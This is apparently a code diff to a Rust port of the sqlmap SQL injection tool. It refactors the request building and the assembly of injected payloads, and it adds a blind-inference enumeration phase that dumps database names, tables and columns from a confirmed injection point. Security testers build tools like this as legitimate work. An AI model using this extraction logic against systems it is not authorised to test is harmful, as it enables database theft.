@@ -61,67 +61,7 @@ impl<'a> Engine<'a> {
     /// Build the request for `param` carrying `new_value` (port of the request
     /// assembly in sqlmap `agent.payload` + `connect.getPage`).
     fn build_request(&self, param: &Param, new_value: &str) -> RequestSpec {
-        let (base, _) = params::split_url(&self.conf.target_url);
-        match param.place {
-            Place::Get => {
-                let query_raw = self
-                    .conf
-                    .target_url
-                    .split_once('?')
-                    .map(|(_, q)| q)
-                    .unwrap_or("");
-                let query = params::mutate(Place::Get, query_raw, &param.name, new_value);
-                RequestSpec {
-                    url: format!("{base}?{query}"),
-                    method: "GET".into(),
-                    body: self.conf.data.clone(),
-                    headers: parse_headers(&self.conf.headers),
-                    cookie: self.conf.cookie.clone(),
-                }
-            }
-            Place::Post => {
-                let body = params::mutate(
-                    Place::Post,
-                    self.conf.data.as_deref().unwrap_or(""),
-                    &param.name,
-                    new_value,
-                );
-                RequestSpec {
-                    url: self.conf.target_url.clone(),
-                    method: "POST".into(),
-                    body: Some(body),
-                    headers: parse_headers(&self.conf.headers),
-                    cookie: self.conf.cookie.clone(),
-                }
-            }
-            Place::Cookie => {
-                let cookie = params::mutate(
-                    Place::Cookie,
-                    self.conf.cookie.as_deref().unwrap_or(""),
-                    &param.name,
-                    new_value,
-                );
-                RequestSpec {
-                    url: self.conf.target_url.clone(),
-                    method: if self.conf.data.is_some() { "POST".into() } else { "GET".into() },
-                    body: self.conf.data.clone(),
-                    headers: parse_headers(&self.conf.headers),
-                    cookie: Some(cookie),
-                }
-            }
-            Place::UserAgent | Place::Referer | Place::CustomHeader => {
-                let mut headers = parse_headers(&self.conf.headers);
-                headers.retain(|(k, _)| !k.eq_ignore_ascii_case(&param.name));
-                headers.push((param.name.clone(), new_value.to_string()));
-                RequestSpec {
-                    url: self.conf.target_url.clone(),
-                    method: if self.conf.data.is_some() { "POST".into() } else { "GET".into() },
-                    body: self.conf.data.clone(),
-                    headers,
-                    cookie: self.conf.cookie.clone(),
-                }
-            }
-        }
+        build_request(self.conf, param, new_value)
     }
 
     fn fetch(&self, spec: &RequestSpec) -> Result<Response, String> {
@@ -167,7 +107,62 @@ impl<'a> Engine<'a> {
             self.scan_param(&param);
             self.kb.tested_params.push(param.name.clone());
         }
+        if self.conf.wants_enumeration() {
+            self.run_enumeration();
+        }
         ScanResult { kb: self.kb, log: self.log }
+    }
+
+    /// --dbs/--tables/--columns/--dump via blind inference on a confirmed
+    /// boolean injection (sqlmap `enumeration` phase over `inference`).
+    fn run_enumeration(&mut self) {
+        let Some(inj) = self
+            .kb
+            .injections
+            .iter()
+            .find(|i| i.technique == Technique::Boolean)
+            .cloned()
+        else {
+            self.say("enumeration skipped: needs a boolean-based injection point (blind inference); none found".to_string());
+            return;
+        };
+        let all = params::extract_params(
+            &self.conf.target_url,
+            self.conf.data.as_deref(),
+            self.conf.cookie.as_deref(),
+        );
+        let Some(param) = all
+            .into_iter()
+            .find(|p| p.name == inj.parameter && p.place == inj.place)
+        else {
+            self.say(format!(
+                "enumeration skipped: cannot rebuild parameter '{}' ({:?})",
+                inj.parameter, inj.place
+            ));
+            return;
+        };
+        self.say(format!(
+            "enumerating via blind inference on '{}' ({:?})",
+            param.name, param.place
+        ));
+        let orig = match self.fetch(&self.build_request(&param, &param.value)) {
+            Ok(r) => r,
+            Err(e) => {
+                self.say(format!("enumeration aborted: baseline refetch failed: {e}"));
+                return;
+            }
+        };
+        let mut ext = crate::exfil::BlindExtractor::new(
+            self.client,
+            self.conf,
+            param,
+            inj,
+            filtered_page(&orig.body),
+            self.conf.page_ratio_threshold,
+        );
+        let results = ext.run();
+        self.log.extend(ext.log);
+        self.kb.enumeration = results;
     }
 
     fn scan_param(&mut self, param: &Param) {
@@ -218,23 +213,7 @@ impl<'a> Engine<'a> {
     /// Assemble final injected value: origValue + prefix + payload + suffix,
     /// with tamper chain applied (sqlmap `agent.payload` assembly order).
     fn assemble(&mut self, param: &Param, boundary: &Boundary, payload_q: &str, seed: u64) -> String {
-        let rn = rand_num(seed);
-        let rn1 = rand_num(seed.wrapping_mul(7).wrapping_add(1));
-        let rs = rand_str(seed.wrapping_mul(13).wrapping_add(3));
-        let rendered = pl::render(payload_q, self.conf.time_sec, rn, rn1, &rs);
-        let suffix = boundary
-            .suffix
-            .replace("[RANDSTR]", &rs)
-            .replace("[RANDNUM]", &rn.to_string());
-        let prefix = boundary.prefix.clone();
-        let mut joined = format!("{}{}{}{}", param.value, prefix, rendered, suffix);
-        if !self.conf.tampers.is_empty() {
-            match sqlmap_tamper::apply_all(&self.conf.tampers, &joined, seed) {
-                Ok(t) => joined = t,
-                Err(e) => self.log.push(format!("  tamper error: {e}")),
-            }
-        }
-        joined
+        assemble(self.conf, &mut self.log, param, boundary, payload_q, seed)
     }
 
     fn payload_ok_static(level: u8, risk: u8, p: &pl::Payload, dbms_hint: Option<&str>) -> bool {
@@ -439,6 +418,89 @@ impl<'a> Engine<'a> {
         }
     }
 }
+
+pub(crate) fn build_request(conf: &Config, param: &Param, new_value: &str) -> RequestSpec {
+        let (base, _) = params::split_url(&conf.target_url);
+        match param.place {
+            Place::Get => {
+                let query_raw = conf
+                    .target_url
+                    .split_once('?')
+                    .map(|(_, q)| q)
+                    .unwrap_or("");
+                let query = params::mutate(Place::Get, query_raw, &param.name, new_value);
+                RequestSpec {
+                    url: format!("{base}?{query}"),
+                    method: "GET".into(),
+                    body: conf.data.clone(),
+                    headers: parse_headers(&conf.headers),
+                    cookie: conf.cookie.clone(),
+                }
+            }
+            Place::Post => {
+                let body = params::mutate(
+                    Place::Post,
+                    conf.data.as_deref().unwrap_or(""),
+                    &param.name,
+                    new_value,
+                );
+                RequestSpec {
+                    url: conf.target_url.clone(),
+                    method: "POST".into(),
+                    body: Some(body),
+                    headers: parse_headers(&conf.headers),
+                    cookie: conf.cookie.clone(),
+                }
+            }
+            Place::Cookie => {
+                let cookie = params::mutate(
+                    Place::Cookie,
+                    conf.cookie.as_deref().unwrap_or(""),
+                    &param.name,
+                    new_value,
+                );
+                RequestSpec {
+                    url: conf.target_url.clone(),
+                    method: if conf.data.is_some() { "POST".into() } else { "GET".into() },
+                    body: conf.data.clone(),
+                    headers: parse_headers(&conf.headers),
+                    cookie: Some(cookie),
+                }
+            }
+            Place::UserAgent | Place::Referer | Place::CustomHeader => {
+                let mut headers = parse_headers(&conf.headers);
+                headers.retain(|(k, _)| !k.eq_ignore_ascii_case(&param.name));
+                headers.push((param.name.clone(), new_value.to_string()));
+                RequestSpec {
+                    url: conf.target_url.clone(),
+                    method: if conf.data.is_some() { "POST".into() } else { "GET".into() },
+                    body: conf.data.clone(),
+                    headers,
+                    cookie: conf.cookie.clone(),
+                }
+            }
+        }
+    }
+
+pub(crate) fn assemble(conf: &Config, log: &mut Vec<String>, param: &Param, boundary: &Boundary, payload_q: &str, seed: u64) -> String {
+        let rn = rand_num(seed);
+        let rn1 = rand_num(seed.wrapping_mul(7).wrapping_add(1));
+        let rs = rand_str(seed.wrapping_mul(13).wrapping_add(3));
+        let rendered = pl::render(payload_q, conf.time_sec, rn, rn1, &rs);
+        let suffix = boundary
+            .suffix
+            .replace("[RANDSTR]", &rs)
+            .replace("[RANDNUM]", &rn.to_string());
+        let prefix = boundary.prefix.clone();
+        let mut joined = format!("{}{}{}{}", param.value, prefix, rendered, suffix);
+        if !conf.tampers.is_empty() {
+            match sqlmap_tamper::apply_all(&conf.tampers, &joined, seed) {
+                Ok(t) => joined = t,
+                Err(e) => log.push(format!("  tamper error: {e}")),
+            }
+        }
+        joined
+    }
 
 fn parse_headers(raw: &[String]) -> Vec<(String, String)> {
     raw.iter()
